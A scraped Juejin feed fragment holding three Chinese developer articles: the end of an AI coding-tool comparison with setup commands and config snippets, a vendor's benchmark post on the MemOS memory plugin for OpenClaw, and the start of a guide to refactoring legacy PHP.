<p>这比任何单一工具的最高档（Cursor Ultra <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>200</mn><mi mathvariant="normal">/</mi><mtext>月或</mtext><mi>C</mi><mi>l</mi><mi>a</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>M</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">200/月或 Claude Max </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">200/</span><span class="mord cjk_fallback">月或</span><span class="mord mathnormal" style="margin-right:0.01968em;">Cl</span><span class="mord mathnormal">a</span><span class="mord mathnormal">u</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span></span></span></span></span>200/月）都便宜，但覆盖的场景更全。</p>
<p>如果预算有限，<strong>优先级</strong>是：</p>
<ol>
<li><strong>Copilot Pro $10/月</strong>（性价比最高的基础配置）</li>
<li><strong>+Cursor Pro $16/月</strong>（日常编码体验质的飞跃）</li>
<li><strong>+Claude Pro $20/月</strong>（解锁架构级 AI 能力）</li>
</ol>
<p>如果你是国内开发者且预算紧张：<strong>Trae（免费）+ Copilot Pro $10/月</strong> 就是极致性价比方案。</p>
<h3 data-id="heading-10">5 分钟配置你的工具组合</h3>
<p>光说不练假把式，这里给你每个工具的快速上手命令，复制就能用。</p>
<p><strong>Claude Code 安装和基础使用：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 Claude Code</span>
npm install -g @anthropic-ai/claude-code

<span class="hljs-comment"># 在项目目录启动，让它理解你的代码库</span>
<span class="hljs-built_in">cd</span> your-project &amp;&amp; claude

<span class="hljs-comment"># 直接给任务，让它自主执行</span>
claude <span class="hljs-string">"把所有 console.log 替换成 structured logging"</span>
</code></pre>
<p><strong>Cursor 项目配置（<code>.cursorrules</code>）：</strong></p>
<p>在项目根目录创建 <code>.cursorrules</code> 文件，让 Cursor 更懂你的项目：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">You</span> are an expert <span class="hljs-keyword">in</span> <span class="hljs-title class_">TypeScript</span>, <span class="hljs-title class_">React</span>, and <span class="hljs-title class_">Node</span>.<span class="hljs-property">js</span>.
- <span class="hljs-title class_">Use</span> functional components <span class="hljs-keyword">with</span> hooks, avoid <span class="hljs-keyword">class</span> <span class="hljs-title class_">components</span>.
- <span class="hljs-title class_">Prefer</span> named <span class="hljs-built_in">exports</span> over <span class="hljs-keyword">default</span> <span class="hljs-built_in">exports</span>.
- <span class="hljs-title class_">Write</span> concise comments <span class="hljs-keyword">in</span> <span class="hljs-title class_">Chinese</span> <span class="hljs-keyword">for</span> complex logic.
- <span class="hljs-title class_">Follow</span> existing project patterns before introducing <span class="hljs-keyword">new</span> ones.
- <span class="hljs-title class_">Always</span> handle error cases explicitly.
</code></pre>
<p><strong>VS Code 中启用 Copilot 最佳配置：</strong></p>
<p>打开 VS Code Settings（JSON），添加：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"github.copilot.enable"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"*"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"markdown"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"plaintext"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"github.copilot.advanced"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"inlineSuggestCount"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"editor.inlineSuggest.enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>这三个配好，你的 AI 编程工具栈就齐活了。</p>
<h3 data-id="heading-11">一个值得关注的趋势</h3>
<p>2026 年 AI 编程工具正在从"代码补全"进化到"自主 Agent"。</p>
<ul>
<li>Copilot 推出了 Workspace，从 Issue 到 PR 全自动</li>
<li>Cursor 支持 8 个 Agent 并行工作</li>
<li>Claude Code 发布了 Agent Teams，多实例协同</li>
</ul>
<p>这意味着开发者的角色正在从"写代码的人"变成"指导 AI 完成任务的人"。你不再需要记住每个 API 的参数签名，但你需要知道<strong>怎么把一个大任务拆成 AI 能处理的小任务、怎么验证 AI 的输出、怎么管理多个 AI Agent 的协作</strong>。</p>
<p>这是 2026 年最值得投资学习的能力。</p>
<h3 data-id="heading-12">总结</h3>
<p>5 个工具，5 句话：</p>
<ul>
<li><strong>Copilot</strong>：每个人都该有的基础配置，$10/月补全无敌</li>
<li><strong>Cursor</strong>：全职写代码就用它，多文件编辑天花板</li>
<li><strong>Claude Code</strong>：做架构、搞重构、调 Bug 的终极武器</li>
<li><strong>Windsurf</strong>：百万行大仓库 + JetBrains 用户的最佳选择</li>
<li><strong>Trae</strong>：国内开发者的零成本入门之选</li>
</ul>
<p>别纠结"哪个最好"——<strong>没有最好的工具，只有最适合你场景的组合</strong>。</p>
<hr/>
<p>如果觉得有帮助，欢迎点赞收藏 👍</p>
<p>更多 AI 开发实战文章，关注公众号「开发者效率局」，每周二/四/六更新。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MemOS OpenClaw 插件测评结果来啦！Tokens 消耗降低 72%+]]></title>    <link>https://juejin.cn/post/7605529884824223807</link>    <guid>https://juejin.cn/post/7605529884824223807</guid>    <pubDate>2026-02-12T12:09:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605529884824223807" data-draft-id="7605530057176760363" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MemOS OpenClaw 插件测评结果来啦！Tokens 消耗降低 72%+"/> <meta itemprop="keywords" content="Python,GitHub"/> <meta itemprop="datePublished" content="2026-02-12T12:09:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MemOS"/> <meta itemprop="url" content="https://juejin.cn/user/3792632680824698"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MemOS OpenClaw 插件测评结果来啦！Tokens 消耗降低 72%+
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3792632680824698/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MemOS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T12:09:12.000Z" title="Thu Feb 12 2026 12:09:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d02721e6448c4c65a99349cd2df6854f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504197&amp;x-signature=WZ6KHILOJuTHmC3UAtN6vOA3%2BZ8%3D" alt="11.jpg" loading="lazy"/></p>
<p>OpenClaw 原生架构的记忆依赖上下文历史拼接、工具调用读写本地文件，以及显式对话指令触发记忆。</p>
<h6 data-id="heading-0">这带来几个问题：</h6>
<ul>
<li><strong>检索算法简陋：</strong> 召回不稳定、相关性弱，Agent 需要反复试错与重问，Token 随对话轮次快速累积。</li>
<li><strong>上下文注入过量：</strong> 每次执行固定读取近两天全量记忆（today + yesterday）+ 长期记忆，缺乏按任务裁剪，导致无效上下文占比高。</li>
<li><strong>记忆缺少结构与去冗余：</strong> 工具调用的长输出（如 find 遍历、config.schema 等）被直接写入并在后续反复重传，成本呈滚雪球式放大。</li>
</ul>
<p>最严重的是上下文爆炸，文件读写加上工具调用日志进入 prompt，导致 token 非线性增长。</p>
<p>原生 OpenClaw 本质是 Prompt 驱动型 Agent，记忆等于上下文，状态等于 token，长期能力等于上下文堆叠。而 OpenClaw + MemOS 转变为系统驱动型 Agent，记忆是系统层，状态是结构化存储，推理是状态调度加模型调用，Agent 从"会聊天的程序"转向"具备长期状态连续性的智能系统组件"。</p>
<p>本次测试，我们用公开数据集和真实任务对 OpenClaw 原生方案和 OpenClaw + MemOS 插件两个方案，对长期记忆能力、跨会话一致性、token 消耗与系统效率进行系统对比评测。</p>
<h2 data-id="heading-1">公开数据集测试（LOCOMO）</h2>
<h3 data-id="heading-2">数据集说明</h3>
<p>通过 LOCOMO（Long-Term Conversational Memory Benchmark），测试两类任务：</p>
<ol>
<li>问答任务测精确召回能力，</li>
<li>事件摘要测长期语义整合能力。</li>
</ol>
<p>评测通过 Gateway 启动两个 OpenClaw 端点版本：原生 OpenClaw、集成 MemOS 插件的 OpenClaw。</p>
<p>测试流程：</p>
<ol>
<li>将数据集中的文本对话输入 OpenClaw，</li>
<li>再以数据集中的问题作为 query 进行提问，</li>
<li>对返回结果进行准确率评估，</li>
<li>并通过底层模型日志统计 token 使用量，从而同时评估记忆效果与系统成本。</li>
</ol>
<h3 data-id="heading-3">全量测试结果</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60527d661c8e438fac237436374d0967~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504197&amp;x-signature=cZGFq7egryFfg7DwGttRLJqlYyo%3D" alt="22.png" loading="lazy"/></p>
<p>准确性方面，<strong>准确率从 0.2373 提升到 0.3168</strong>，说明长期对话的记忆稳定性明显增强。Agent 不再只靠上下文拼接做短期推理，而是有了结构化记忆调度能力。</p>
<p>成本方面，<strong>模型调用次数降低 59.5%，token 消耗降低 72%+</strong>。系统不再通过"堆 prompt"维持状态，而是通过记忆系统做状态抽取、结构化存储和按需激活。这是个重要转变：从"上下文记忆"到"系统记忆"。</p>
<h2 data-id="heading-4">真实任务测试（工程场景）</h2>
<p>公开数据集只能验证模型能力上限，真实系统更关心工程行为：跨会话连续任务、复杂状态保持、长期协作交互。</p>
<p>我们构建了一组复杂真实任务流，测试跨会话任务连续性、多维度信息检索稳定性、记忆写入与召回效率，以及 token 成本随复杂度的增长趋势。</p>
<p>MemOS OpenClaw Plugin 通过自动记忆机制，让 Agent 的所有交互进入记忆系统，形成结构化存储和可调度状态。</p>
<h3 data-id="heading-5">工程实测对比</h3>
<h4 data-id="heading-6">跨会话任务测试</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/761728fd3a4b4d4681a3d4d0a8c00453~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504197&amp;x-signature=HMqlVhGCgF1PuNAorH7VUJVDWVQ%3D" alt="33.png" loading="lazy"/></p>
<p>集成 MemOS 后，<strong>对话轮次减少约 53%，token 消耗减少约 49%。</strong></p>
<p>跨会话任务可以自然延续，无需用户反复重建上下文。不再出现"行为反转"、"偏好丢失"、"任务方向漂移"这些问题。</p>
<p>Agent 从"短期记忆型对话工具"转变为"具备长期状态连续性的协作系统"。</p>
<h4 data-id="heading-7">单会话记忆读写效率测试</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ecb76230ddc4cc8bffbf0ed7e466908~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504197&amp;x-signature=AuvMOp%2BrOiMntHZHsJu4V9sjeFQ%3D" alt="44.png" loading="lazy"/></p>
<p>在 OpenClaw 原生架构中，记忆读写依赖工具调用，本地文件操作产生大量不可控上下文污染，一次"写一句话"的操作能引入数千 token 的上下文膨胀。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30f55cb5f74e41889790b087139b4145~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504197&amp;x-signature=23jueb2gRs%2B6O75p8pTIKxGEmO0%3D" alt="55.png" loading="lazy"/></p>
<p>MemOS 将记忆从"prompt 负担"转为"系统状态层"，记忆不进入上下文堆叠而是按需激活注入，状态与对话解耦，记忆与推理解耦，从架构上阻断了 token 爆炸路径。</p>
<h2 data-id="heading-8">从工具到落地</h2>
<h5 data-id="heading-9">Token 成本可控：从“全量灌上下文”变成“按任务精确召回”</h5>
<p>OpenClaw 不再每次固定塞入 today+yesterday+ 长期记忆，而是由 MemOS 按当前任务检索最相关的少量记忆（可设定召回预算/条数），显著降低无效上下文占比，避免 Token 滚雪球。</p>
<h5 data-id="heading-10">检索更稳更准：减少反复试错与重问，提升一次命中率</h5>
<p>MemOS 提供更强的记忆组织与检索能力（结构化、分层/多粒度、语义检索 + 规则过滤等），让 OpenClaw 召回的内容相关性更强、稳定性更高，减少 Agent 因“召回不稳”导致的重复推理与反复确认。</p>
<h5 data-id="heading-11">记忆更干净可用：结构化 + 去冗余 + 高压缩，避免“长输出污染”</h5>
<p>工具调用的长输出（如遍历结果、config/schema 等）不会直接原样反复写入上下文；MemOS 可以做摘要/压缩、去重与归档，长期运行越用越“清爽”，记忆质量随时间提升而不是劣化。</p>
<p>在真实工程环境中，这带来可扩展性提升、token 成本可控、跨会话能力稳定、长期任务可持续，以及 Agent 行为一致性增强。</p>
<blockquote>
<p><strong>记忆不再是 prompt 技巧，而是系统架构能力。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-12">立即体验</h2>
<p>🦞 Your lobster now has a working memory system.</p>
<p><strong>Get your API key:</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmemos-dashboard.openmem.net%2Fquickstart%2F%3Fentrance%3Dwechat" target="_blank" title="https://memos-dashboard.openmem.net/quickstart/?entrance=wechat" ref="nofollow noopener noreferrer">memos-dashboard.openmem.net/quickstart/…</a></p>
<p><strong>Try it: Full tutorial</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMemTensor%2FMemOS" target="_blank" title="https://github.com/MemTensor/MemOS" ref="nofollow noopener noreferrer">github.com/MemTensor/M…</a></p>
<hr/>
<h4 data-id="heading-13">关于 MemOS</h4>
<p>MemOS 为 AI 应用构建统一的记忆管理平台，让智能系统如大脑般拥有灵活、可迁移、可共享的长期记忆和即时记忆。</p>
<p>作为记忆张量首次提出“记忆调度”架构的 AI 记忆操作系统，我们希望通过 MemOS 全面重构模型记忆资源的生命周期管理，为智能系统提供高效且灵活的记忆管理能力。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d394214015cb4a4cba567d2175db7960~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVtT1M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771504197&amp;x-signature=90MNCJg%2FPD8xxegabNKy9aAZ%2FMg%3D" alt="66.jpg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何重构遗留 PHP 代码 不至于崩溃]]></title>    <link>https://juejin.cn/post/7605848213602992174</link>    <guid>https://juejin.cn/post/7605848213602992174</guid>    <pubDate>2026-02-13T00:06:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602992174" data-draft-id="7605769126271516718" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何重构遗留 PHP 代码 不至于崩溃"/> <meta itemprop="keywords" content="后端,PHP"/> <meta itemprop="datePublished" content="2026-02-13T00:06:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何重构遗留 PHP 代码 不至于崩溃
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T00:06:21.000Z" title="Fri Feb 13 2026 00:06:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">如何重构遗留 PHP 代码 不至于崩溃</h2>
<h3 data-id="heading-1">当你意识到自己接手了一坨遗留代码</h3>
<p>通常是这样开始的。</p>
<p>有人让你修一个小 bug，可能是个验证问题，可能是个只在生产环境出现的奇怪边界情况。你打开文件，想着很快就能搞定。</p>
<p>然后你看到了：</p>
<ul>
<li>一个文件 3000 行</li>
<li>业务逻辑和 HTML 混在一起</li>
<li>循环里面写数据库查询</li>
<li>变量名叫 <code>$x</code>、<code>$temp</code>、<code>$data2</code></li>
<li>函数的返回类型取决于代码当时的心情</li>
</ul>
